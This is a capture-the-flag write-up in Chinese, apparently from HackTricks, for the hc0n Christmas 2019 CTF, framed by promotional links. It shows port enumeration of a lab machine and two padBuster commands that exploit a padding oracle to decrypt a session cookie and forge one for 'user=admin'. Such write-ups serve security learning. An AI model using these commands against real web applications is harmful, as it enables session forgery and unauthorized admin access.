# hc0n圣诞CTF - 2019

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks中被宣传**吗？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 探索我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f)或[**电报群**](https://t.me/peass)，或在**Twitter**上关注我**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

![](../../.gitbook/assets/41d0cdc8d99a8a3de2758ccbdf637a21.jpeg)

## 枚举

我开始使用我的工具[**Legion**](https://github.com/carlospolop/legion)来**枚举机器**：

![](<../../.gitbook/assets/image (244).png>)

有2个端口开放：80（**HTTP**）和22（**SSH**）

在网页上，你可以**注册新用户**，我注意到**cookie的长度取决于指定的用户名的长度**：

![](<../../.gitbook/assets/image (245).png>)

![](<../../.gitbook/assets/image (246).png>)

如果你改变**cookie**的一些**字节**，你会得到这个错误：

![](<../../.gitbook/assets/image (247).png>)

有了这些信息和[**阅读填充Oracle漏洞**](../../cryptography/padding-oracle-priv.md)，我成功利用了它：
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
```
**设置管理员用户：**
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" -plaintext "user=admin"
```
![](<../../.gitbook/assets/image (250).png>)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **您在** **网络安全公司** **工作吗？ 想要在** **HackTricks** **中看到您的** **公司广告** **吗？ 或者想要访问** **PEASS** **的最新版本或下载** **HackTricks** **的PDF** **吗？ 请查看** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家**NFTs**收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 衣服**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord 群组**](https://discord.gg/hRep4RUj7f) **或** **电报群组** **或在** **Twitter** **上关注我** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交 PR 来分享您的黑客技巧**。

</details>
